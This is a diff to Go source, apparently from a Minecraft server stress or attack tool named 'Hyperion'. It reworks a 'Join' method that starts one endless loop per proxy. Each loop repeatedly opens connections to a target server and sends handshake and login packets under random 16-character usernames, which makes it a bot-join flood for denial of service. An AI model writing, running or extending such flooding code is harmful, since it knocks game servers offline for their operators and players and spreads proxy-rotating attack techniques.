@@ -6,6 +6,7 @@ import (
 	"Hyperion/mc"
 	"Hyperion/mc/mcutils"
 	"Hyperion/utils"
+	"fmt"
 	"strconv"
 	"time"
 )
@@ -28,36 +29,38 @@ func (join Join) Description() string {
 func (join Join) Start() {
 	utils.Init()
 	shouldRun = true
-	for i := 0; i < join.Info.Loops; i++ {
+
+	for i := 0; i < join.ProxyManager.Length(); i++ {
+		fmt.Printf("Started %d loops", i)
 		go loop(&join)
+		fmt.Printf("\r")
 	}
+	fmt.Println("ALL LOOPS RUNNING!")
 }
 
 func loop(join *Join) {
+	proxy := join.ProxyManager.GetNext()
 	for shouldRun {
-		for i := 0; i < join.Info.PerDelay; i++ {
-			go connect(join)
+		for i := 0; i < join.Info.ConnPerProxyPerDelay; i++ {
+			go connect(&join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
 		}
 		time.Sleep(join.Info.Delay)
 	}
 }
 
-func connect(join *Join) error {
+func connect(ip *string, port *string, protocol int, proxy *proxy.Proxy) error {
 
-	proxy := join.ProxyManager.GetNext()
-
-	conn, err := mc.DialMC(join.Info.Ip, join.Info.Port, proxy)
+	conn, err := mc.DialMC(ip, port, proxy)
 	if err != nil {
 		return err
 	}
 
-	port, perr := strconv.Atoi(join.Info.Port)
+	intport, perr := strconv.Atoi(*port)
 	if perr != nil {
-		join.ProxyManager.Remove(proxy)
 		return perr
 	}
 
-	mcutils.WriteHandshake(conn, join.Info.Ip, port, join.Info.Protocol, mcutils.Login)
+	mcutils.WriteHandshake(conn, *ip, intport, protocol, mcutils.Login)
 	mcutils.WriteLoginPacket(conn, utils.RandomName(16), false, nil)
 	return nil
 }
